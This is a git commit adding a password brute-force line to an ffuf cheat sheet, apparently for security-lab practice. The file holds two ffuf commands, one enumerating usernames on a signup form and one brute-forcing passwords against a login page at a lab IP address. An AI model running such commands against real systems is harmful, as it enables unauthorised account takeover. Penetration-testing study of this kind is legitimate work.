7daf7698266d51365faf7b6730b3678c1bb7308a
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-03-31 21:58:21 +0500

    Update ffuf_cheatsheet.sh

--- Tools/FFuF/ffuf_cheatsheet.sh
+++ Tools/FFuF/ffuf_cheatsheet.sh
@@ -1,2 +1,5 @@
 # Fuzz usernames in a POST request to a signup page, checking for a response indicating that the username already exists.
 ffuf -w /path/to/your/username_list -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://target-ip/signup -mr "username already exists"
+
+# Brute Force Passwords on Users
+ffuf -w username_list.txt:W1,/path/to/your/password_list:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.172.27/customers/login -fc 200
